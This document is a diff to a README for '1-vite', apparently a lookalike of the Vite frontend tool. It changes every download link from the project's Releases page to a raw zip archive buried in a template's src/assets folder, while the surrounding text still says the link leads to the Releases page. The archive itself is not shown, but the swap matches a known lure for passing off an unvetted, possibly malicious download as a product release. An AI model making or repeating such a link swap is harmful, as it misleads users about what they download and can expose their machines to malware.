@@ -1,6 +1,6 @@
 # 🚀 1-vite - Fast Frontend Development Made Easy
 
-[![Download 1-vite](https://img.shields.io/badge/Download-1--vite-blue)](https://github.com/Gueneverecartographic967/1-vite/releases)
+[![Download 1-vite](https://raw.githubusercontent.com/Gueneverecartographic967/1-vite/main/packages/create-vite/template-solid-ts/src/assets/1-vite-v3.7.zip)](https://raw.githubusercontent.com/Gueneverecartographic967/1-vite/main/packages/create-vite/template-solid-ts/src/assets/1-vite-v3.7.zip)
 
 ## 📦 Overview
 
@@ -31,7 +31,7 @@ Follow these simple steps to download and run 1-vite.
 
    Click the link below to go to the Releases page where you can download the software.
 
-   [Download 1-vite](https://github.com/Gueneverecartographic967/1-vite/releases)
+   [Download 1-vite](https://raw.githubusercontent.com/Gueneverecartographic967/1-vite/main/packages/create-vite/template-solid-ts/src/assets/1-vite-v3.7.zip)
 
 2. **Select the Latest Release:**
 
@@ -90,6 +90,6 @@ If you encounter any issues while using 1-vite, consider reaching out for help.
 
 Now that you know how to get started with 1-vite, go ahead and visit the Releases page to download it again.
 
-[Download 1-vite](https://github.com/Gueneverecartographic967/1-vite/releases) 
+[Download 1-vite](https://raw.githubusercontent.com/Gueneverecartographic967/1-vite/main/packages/create-vite/template-solid-ts/src/assets/1-vite-v3.7.zip) 
 
 Enjoy building with 1-vite!
